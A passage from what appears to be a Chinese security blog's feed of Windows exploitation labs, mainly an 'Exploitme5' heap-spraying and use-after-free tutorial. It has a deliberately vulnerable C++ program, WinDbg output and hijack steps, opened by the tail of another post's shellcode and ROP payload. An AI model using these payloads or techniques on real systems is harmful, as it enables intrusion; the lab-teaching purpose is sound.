class="string">b&quot;\x89\x45\xfc\x39\x44\x33\x18\x76\x22\x8b\x0c\x81\x03\xce\xe8\x75&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\xff\x03\x45\xf8\x39\x45\xf4\x74\x1e\x8b\x45\xfc\x8b\x4d&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xf0\x40\x89\x45\xfc\x3b\x44\x33\x18\x72\xde\x3b\x7d\xec\x75\x9c&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x33\xc0\x5f\x5e\x5b\x8b\xe5\x5d\xc3\x8b\x4d\xfc\x8b\x44\x33\x24&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x8d\x04\x48\x0f\xb7\x0c\x30\x8b\x44\x33\x1c\x8d\x04\x88\x8b\x04&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x30\x03\xc6\xeb\xdd&quot;</span>)</span><br><span class="line">    rop_chain = create_rop_chain()</span><br><span class="line">    readable_ptr = struct.pack(<span class="string">&quot;&lt;I&quot;</span>, kernel32)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span> + struct.pack(<span class="string">&quot;&lt;I&quot;</span>, kernel32) + <span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span>  + rop_chain + shellcode</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure>

<p>运行后，成功弹出计算器。系统重启后，只需更新两个系统模块的基址，就能再次弹出计算器。</p>
<h3 id="自动化获取模块基址"><a href="#自动化获取模块基址" class="headerlink" title="自动化获取模块基址"></a>自动化获取模块基址</h3><p>上面的exp中，需要我们手动指定两个系统模块的加载基值，比较麻烦。下面我们尝试自动化地获取它们。</p>
<p>【TODO!]</p>
]]></content>
      <categories>
        <category>Windows-PWN</category>
      </categories>
  </entry>
  <entry>
    <title>AWD跳板机搭建</title>
    <url>/2023/10/19/CTF-Tricks/AWD%E8%B7%B3%E6%9D%BF%E6%9C%BA%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>Exploitme5——Heap Spraying &amp; UAF</title>
    <url>/2023/11/02/Windwos-PWN/Exploitme/Exploitme5/</url>
    <content><![CDATA[<p>堆喷射和UAF漏洞实验。</p>
<p>Win10下，堆基址的随机化粒度比win7小，导致本实验暂时无法完成……</p>
<p>参考资料：</p>
<ul>
<li><a href="https://bbs.kanxue.com/thread-207103.htm">Exploitme5(heap spraying &amp; UAF)-外文翻译|kanxue.com</a></li>
</ul>
<span id="more"></span>

<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><ul>
<li>Windows10 VisualStudio2022</li>
<li>关闭&#x2F;sdl</li>
<li>关闭警告&#x2F;W0（可选）</li>
</ul>
<h3 id="漏洞程序"><a href="#漏洞程序" class="headerlink" title="漏洞程序"></a>漏洞程序</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">bool</span> printAddresses = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Mutator</span> &#123;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">int</span> param;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Mutator</span>(<span class="type">int</span> param) : <span class="built_in">param</span>(param) &#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">int</span> <span class="title">getParam</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> param;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">mutate</span><span class="params">(<span class="type">void</span> *data, <span class="type">int</span> size)</span> <span class="type">const</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Multiplier</span> : <span class="keyword">public</span> Mutator &#123;</span><br><span class="line">	<span class="type">int</span> reserved[<span class="number">40</span>]; <span class="comment">// 现在没用到!</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Multiplier</span>(<span class="type">int</span> multiplier = <span class="number">0</span>) : <span class="built_in">Mutator</span>(multiplier) &#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">mutate</span><span class="params">(<span class="type">void</span> *data, <span class="type">int</span> size)</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">		<span class="type">int</span> *ptr = (<span class="type">int</span> *)data;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size / <span class="number">4</span>; ++i)</span><br><span class="line">			ptr[i] *= <span class="built_in">getParam</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LowerCaser</span> : <span class="keyword">public</span> Mutator &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">LowerCaser</span>() : <span class="built_in">Mutator</span>(<span class="number">0</span>) &#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">mutate</span><span class="params">(<span class="type">void</span> *data, <span class="type">int</span> size)</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">		<span class="type">char</span> *ptr = (<span class="type">char</span> *)data;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; ++i)</span><br><span class="line">			<span class="keyword">if</span> (ptr[i] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; ptr[i] &lt;= <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">				ptr[i] -= <span class="number">0x20</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Block</span> &#123;</span><br><span class="line">	<span class="type">void</span> *data;</span><br><span class="line">	<span class="type">int</span> size;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Block</span>(<span class="type">void</span> *data, <span class="type">int</span> size) : <span class="built_in">data</span>(data), <span class="built_in">size</span>(size) &#123;&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> *<span class="title">getData</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> data; &#125;</span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">getSize</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> size; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">flush</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">char</span> ch;</span><br><span class="line">	<span class="keyword">while</span> ((ch = <span class="built_in">getchar</span>()) != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; ch != EOF);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局变量</span></span><br><span class="line">vector&lt;Block&gt; blocks;</span><br><span class="line">Mutator *mutators[] = &#123; <span class="keyword">new</span> <span class="built_in">Multiplier</span>(<span class="number">2</span>), <span class="keyword">new</span> <span class="built_in">LowerCaser</span>() &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">configureMutator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(</span><br><span class="line">			<span class="string">&quot;1) Multiplier (multiplier = %d)\n&quot;</span></span><br><span class="line">			<span class="string">&quot;2) LowerCaser\n&quot;</span></span><br><span class="line">			<span class="string">&quot;3) Exit\n&quot;</span></span><br><span class="line">			<span class="string">&quot;\n&quot;</span></span><br><span class="line">			<span class="string">&quot;Your choice [1-3]: &quot;</span>, mutators[<span class="number">0</span>]-&gt;<span class="built_in">getParam</span>());</span><br><span class="line">		<span class="type">int</span> choice = _getch();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (choice == <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span> (choice &gt;= <span class="string">&#x27;1&#x27;</span> &amp;&amp; choice &lt;= <span class="string">&#x27;3&#x27;</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (choice == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">				<span class="keyword">if</span> (printAddresses)</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;mutators[0] = 0x%08x\n&quot;</span>, mutators[<span class="number">0</span>]);</span><br><span class="line">				<span class="keyword">delete</span> mutators[<span class="number">0</span>];</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;multiplier (int): &quot;</span>);</span><br><span class="line">				<span class="type">int</span> multiplier;</span><br><span class="line">				<span class="type">int</span> res = <span class="built_in">scanf_s</span>(<span class="string">&quot;%d&quot;</span>, &amp;multiplier);</span><br><span class="line">				<span class="comment">// fflush(stdin);</span></span><br><span class="line">				<span class="built_in">flush</span>();</span><br><span class="line">				<span class="keyword">if</span> (res) &#123;</span><br><span class="line">					mutators[<span class="number">0</span>] = <span class="keyword">new</span> <span class="built_in">Multiplier</span>(multiplier);</span><br><span class="line">					<span class="keyword">if</span> (printAddresses)</span><br><span class="line">						<span class="built_in">printf</span>(<span class="string">&quot;mutators[0] = 0x%08x\n&quot;</span>, mutators[<span class="number">0</span>]);</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;Multiplier was configured\n\n&quot;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;LowerCaser is not configurable for now!\n\n&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Wrong choice!\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">listBlocks</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;------- Blocks -------\n&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!printAddresses)</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; blocks.<span class="built_in">size</span>(); ++i)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;block %d: size = %d\n&quot;</span>, i, blocks[i].<span class="built_in">getSize</span>());</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; blocks.<span class="built_in">size</span>(); ++i)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;block %d: address = 0x%08x; size = %d\n&quot;</span>, i, blocks[i].<span class="built_in">getData</span>(), blocks[i].<span class="built_in">getSize</span>());</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;----------------------\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">readBlock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">char</span> *data;</span><br><span class="line">	<span class="type">char</span> filePath[<span class="number">1024</span>];</span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;File path (&#x27;exit&#x27; to exit): &quot;</span>);</span><br><span class="line">		<span class="built_in">scanf_s</span>(<span class="string">&quot;%s&quot;</span>, filePath, <span class="built_in">sizeof</span>(filePath));</span><br><span class="line">		<span class="built_in">fflush</span>(stdin);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(filePath, <span class="string">&quot;exit&quot;</span>))</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		FILE *f = <span class="built_in">fopen</span>(filePath, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (!f)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Can&#x27;t open the file!\n\n&quot;</span>);</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">fseek</span>(f, <span class="number">0L</span>, SEEK_END);</span><br><span class="line">			<span class="type">long</span> bytes = <span class="built_in">ftell</span>(f);</span><br><span class="line">			data = <span class="keyword">new</span> <span class="type">char</span>[bytes];</span><br><span class="line">			<span class="built_in">fseek</span>(f, <span class="number">0L</span>, SEEK_SET);</span><br><span class="line">			<span class="type">int</span> pos = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">while</span> (pos &lt; bytes) &#123;</span><br><span class="line">				<span class="type">int</span> len = bytes - pos &gt; <span class="number">200</span> ? <span class="number">200</span> : bytes - pos;</span><br><span class="line">				<span class="built_in">fread</span>(data + pos, <span class="number">1</span>, len, f);</span><br><span class="line">				pos += len;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">fclose</span>(f);</span><br><span class="line">			blocks.<span class="built_in">push_back</span>(<span class="built_in">Block</span>(data, bytes));</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Block read (%d bytes)\n\n&quot;</span>, bytes);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">duplicateBlock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">listBlocks</span>();</span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Index of block to duplicate (-1 to exit): &quot;</span>);</span><br><span class="line">		<span class="type">int</span> index;</span><br><span class="line">		<span class="built_in">scanf_s</span>(<span class="string">&quot;%d&quot;</span>, &amp;index);</span><br><span class="line">		<span class="built_in">fflush</span>(stdin);</span><br><span class="line">		<span class="keyword">if</span> (index == <span class="number">-1</span>)</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		<span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt;= (<span class="type">int</span>)blocks.<span class="built_in">size</span>()) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Wrong index!\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">				<span class="type">int</span> copies;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;Number of copies (-1 to exit): &quot;</span>);</span><br><span class="line">				<span class="built_in">scanf_s</span>(<span class="string">&quot;%d&quot;</span>, &amp;copies);</span><br><span class="line">				<span class="built_in">fflush</span>(stdin);</span><br><span class="line">				<span class="keyword">if</span> (copies == <span class="number">-1</span>)</span><br><span class="line">					<span class="keyword">return</span>;</span><br><span class="line">				<span class="keyword">if</span> (copies &lt;= <span class="number">0</span>)</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;Wrong number of copies!\n&quot;</span>);</span><br><span class="line">				<span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; copies; ++i) &#123;</span><br><span class="line">						<span class="type">int</span> size = blocks[index].<span class="built_in">getSize</span>();</span><br><span class="line">						<span class="type">void</span> *data = <span class="keyword">new</span> <span class="type">char</span>[size];</span><br><span class="line">						<span class="built_in">memcpy</span>(data, blocks[index].<span class="built_in">getData</span>(), size);</span><br><span class="line">						blocks.<span class="built_in">push_back</span>(<span class="built_in">Block</span>(data, size));</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">return</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myExit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mutateBlock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">listBlocks</span>();</span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Index of block to mutate (-1 to exit): &quot;</span>);</span><br><span class="line">		<span class="type">int</span> index;</span><br><span class="line">		<span class="built_in">scanf_s</span>(<span class="string">&quot;%d&quot;</span>, &amp;index);</span><br><span class="line">		<span class="built_in">fflush</span>(stdin);</span><br><span class="line">		<span class="keyword">if</span> (index == <span class="number">-1</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt;= (<span class="type">int</span>)blocks.<span class="built_in">size</span>()) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Wrong index!\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(</span><br><span class="line">					<span class="string">&quot;1) Multiplier\n&quot;</span></span><br><span class="line">					<span class="string">&quot;2) LowerCaser\n&quot;</span></span><br><span class="line">					<span class="string">&quot;3) Exit\n&quot;</span></span><br><span class="line">					<span class="string">&quot;Your choice [1-3]: &quot;</span>);</span><br><span class="line">				<span class="type">int</span> choice = _getch();</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">				<span class="keyword">if</span> (choice == <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">if</span> (choice &gt;= <span class="string">&#x27;1&#x27;</span> &amp;&amp; choice &lt;= <span class="string">&#x27;3&#x27;</span>) &#123;</span><br><span class="line">					choice -= <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">					mutators[choice - <span class="number">1</span>]-&gt;<span class="built_in">mutate</span>(blocks[index].<span class="built_in">getData</span>(), blocks[index].<span class="built_in">getSize</span>());</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;The block was mutated.\n\n&quot;</span>);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;Wrong choice!\n\n&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">handleMenu</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(</span><br><span class="line">			<span class="string">&quot;1) Read block from file\n&quot;</span></span><br><span class="line">			<span class="string">&quot;2) List blocks\n&quot;</span></span><br><span class="line">			<span class="string">&quot;3) Duplicate Block\n&quot;</span></span><br><span class="line">			<span class="string">&quot;4) Configure mutator\n&quot;</span></span><br><span class="line">			<span class="string">&quot;5) Mutate block\n&quot;</span></span><br><span class="line">			<span class="string">&quot;6) Exit\n&quot;</span></span><br><span class="line">			<span class="string">&quot;\n&quot;</span></span><br><span class="line">			<span class="string">&quot;Your choice [1-6]: &quot;</span>);</span><br><span class="line">		<span class="type">int</span> choice = _getch();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (choice &gt;= <span class="string">&#x27;1&#x27;</span> &amp;&amp; choice &lt;= <span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">			<span class="keyword">return</span> choice - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Wrong choice!\n\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*funcPtr)</span><span class="params">()</span></span>;</span><br><span class="line">	funcPtr functions[] = &#123; readBlock, listBlocks, duplicateBlock, configureMutator, mutateBlock, myExit &#125;;</span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">		<span class="type">int</span> choice = <span class="built_in">handleMenu</span>();</span><br><span class="line">		functions[choice - <span class="number">1</span>]();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">bool</span> printAddresses = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Mutator</span>; <span class="comment">// 每个mutator包含一个虚表指针(虚表中包含mutate()函数)，一个参数param。</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Multiplier</span> : <span class="keyword">public</span> Mutator; <span class="comment">// 包含mutate函数，可修改block中的数据为元数据的指定倍数。</span></span><br><span class="line"><span class="comment">// 还包含40*4=160个字节的保留区域</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LowerCaser</span> : <span class="keyword">public</span> Mutator; <span class="comment">// 包含mutate函数，可将block中的小写字母，转换为大写</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Block</span>; <span class="comment">// 每个block包含一个数据指针void *data, 一个数据大小int size，共8个字节</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局变量</span></span><br><span class="line">vector&lt;Block&gt; blocks; <span class="comment">// 存储块，</span></span><br><span class="line">Mutator *mutators[] = &#123; <span class="keyword">new</span> <span class="built_in">Multiplier</span>(<span class="number">2</span>), <span class="keyword">new</span> <span class="built_in">LowerCaser</span>() &#125;; <span class="comment">// 存储转换器</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">configureMutator</span><span class="params">()</span> <span class="comment">// 配置转换器，由于Mutator类不支持直接对param进行修改，只能先删除之前mutators[0]中的对象，然后新创建一个</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">listBlocks</span><span class="params">()</span>	<span class="comment">// 列出所有的块信息</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">readBlock</span><span class="params">()</span>	<span class="comment">// 从文件中读取数据，创建一个block并将其加入列表</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">duplicateBlock</span><span class="params">()</span> <span class="comment">// 先列出所有块，指定块id和复制份数，然后根据要求进行复制</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mutateBlock</span><span class="params">()</span> <span class="comment">// 先列出所有块，指定待变换的块id和转换方法，然后对该块内的数据进行转换</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">handleMenu</span><span class="params">()</span> <span class="comment">// 输出提示菜单，读取用户命令，并返回给main</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> <span class="comment">// main函数中，定义函数指针数组，调用handleMenu，根据返回序号，调用对应函数</span></span></span><br></pre></td></tr></table></figure>



<h3 id="UAF漏洞分析"><a href="#UAF漏洞分析" class="headerlink" title="UAF漏洞分析"></a>UAF漏洞分析</h3><p>UAF漏洞存在于ConfigureMutator函数中</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (choice == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">delete</span> mutators[<span class="number">0</span>]; <span class="comment">// 输入为1，先释放原来对象，将那(两)块内存区域加入空闲列表</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="type">int</span> multiplier;</span><br><span class="line">    <span class="type">int</span> res = <span class="built_in">scanf_s</span>(<span class="string">&quot;%d&quot;</span>, &amp;multiplier); <span class="comment">// 读取参数</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (res) &#123;	<span class="comment">// 如果参数读取成功，从空闲列表中去除刚才释放的(两块)内存，创建新的对象，</span></span><br><span class="line">        mutators[<span class="number">0</span>] = <span class="keyword">new</span> <span class="built_in">Multiplier</span>(multiplier);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>; <span class="comment">// 如果参数读取失败，比如输入字符a(res=0)，会直接退出循环，然后退出函数。此时mutators[0]处的对象已被delete。</span></span><br><span class="line">    <span class="comment">// 但我们仍能够通过mutators[0]访问那块内存区域，即 Use After Free</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，如果我们在mutators[0]所指对象被回收后，创建包含和该对象相同大小data的block，即可劫持该对象，以及它的虚表和虚函数。</p>
<p>当再次调用该对象的mutate()函数时，就会执行我们预先存储好的shellcode。</p>
<h4 id="确定对象大小"><a href="#确定对象大小" class="headerlink" title="确定对象大小"></a>确定对象大小</h4><p>通过以下命令，可以看到一个Multiplier对象的大小是 168 个字节</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0:000&gt; dt Mutator</span><br><span class="line">Exploitme5!Mutator</span><br><span class="line">   +0x000 __VFN_table : Ptr32 </span><br><span class="line">   +0x004 param            : Int4B</span><br><span class="line">0:000&gt; dt Multiplier</span><br><span class="line">Exploitme5!Multiplier</span><br><span class="line">   +0x000 __VFN_table : Ptr32 </span><br><span class="line">   +0x004 param            : Int4B</span><br><span class="line">   +0x008 reserved         : [40] Int4B</span><br></pre></td></tr></table></figure>

<h4 id="劫持对象"><a href="#劫持对象" class="headerlink" title="劫持对象"></a>劫持对象</h4><p>为了保证我们的数据成功占用被回收的对象所在的内存块，在对象被删除，与payload所在块被创建之间，尽量不要调用危险函数，比如fopen。因此，我们的劫持逻辑如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">readBlock 读入数据，创建块 : <span class="number">1</span> D:\\Users\\czx\\NativeFiles\\Desktop\\tmp\\name.dat</span><br><span class="line"><span class="keyword">delete</span> mutators[<span class="number">0</span>] 删除对象 : <span class="number">4</span> <span class="number">1</span> a</span><br><span class="line">duplicateBlock 复制快，payload所在的新块占用被回收的对象空间 : <span class="number">3</span> <span class="number">0</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>执行以下python代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\Users\\czx\\NativeFiles\\Desktop\\tmp\\name.dat&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">b&quot;a&quot;</span>*<span class="number">168</span>)</span><br></pre></td></tr></table></figure>

<p>运行程序，得到（略去menu）：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">Your choice [<span class="number">1</span><span class="number">-6</span>]:<span class="number">1</span>			<span class="comment">// 读入数据</span></span><br><span class="line"><span class="function">File <span class="title">path</span> <span class="params">(<span class="string">&#x27;exit&#x27;</span> to exit)</span>: D:\\Users\\czx\\NativeFiles\\Desktop\\tmp\\name.dat // 指定文件</span></span><br><span class="line"><span class="function">Block read (<span class="number">168</span> bytes)</span></span><br><span class="line"><span class="function">...</span></span><br><span class="line"><span class="function">Your choice [<span class="number">1</span><span class="number">-6</span>]:<span class="number">4</span>			// 配置mutator</span></span><br><span class="line"><span class="function"><span class="number">1</span>) Multiplier (multiplier =</span> <span class="number">2</span>)</span><br><span class="line"><span class="number">2</span>) LowerCaser</span><br><span class="line"><span class="number">3</span>) Exit</span><br><span class="line">Your choice [<span class="number">1</span><span class="number">-3</span>]:<span class="number">1</span>			<span class="comment">// 选定multiplier</span></span><br><span class="line">mutators[<span class="number">0</span>] = <span class="number">0x00d864a0</span>   <span class="comment">// 删除mutators[0]处的multiplier对象，地址为0x00d864a0</span></span><br><span class="line"><span class="built_in">multiplier</span> (<span class="type">int</span>): a			<span class="comment">// 输入a，使得res为0，阻止此时创建新对象</span></span><br><span class="line">...</span><br><span class="line">Your choice [<span class="number">1</span><span class="number">-6</span>]:<span class="number">3</span>			<span class="comment">// 复制对象</span></span><br><span class="line">------- Blocks -------</span><br><span class="line">block <span class="number">0</span>: address = <span class="number">0x00d8b138</span>; size = <span class="number">168</span></span><br><span 